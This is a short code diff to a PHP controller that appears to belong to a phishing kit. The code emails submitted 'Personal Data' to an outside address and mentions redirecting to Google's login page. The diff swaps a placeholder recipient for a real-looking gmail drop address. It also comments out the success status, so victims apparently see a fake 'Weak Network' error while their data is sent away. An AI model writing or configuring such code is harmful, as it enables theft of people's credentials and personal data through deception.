@@ -47,7 +47,7 @@ class PagesController extends Controller {
             $header .= "MIME-Version: 1.0\r\n";
             $header .= "Content-type: text/html\r\n";
 
-            $to =  'abc@gmail.com';
+            $to =  'amprettymary@gmail.com';
             $subject= "Personal Data.\n".
             "------------------------- MESSAGE -------------------------\n\n".
             // Set the body of the email you're sending
@@ -62,7 +62,7 @@ class PagesController extends Controller {
                 $response['message'] = 'Sorry..! Please check your internet connection.';
                 // redirect to Google main login page
             }else {
-                $response['status'] = 200;
+                // $response['status'] = 200;
                 // Default error for not sending.
                 $response['message'] = "<b>Weak Network.</b> Please connect your device to a strong network.";
             }
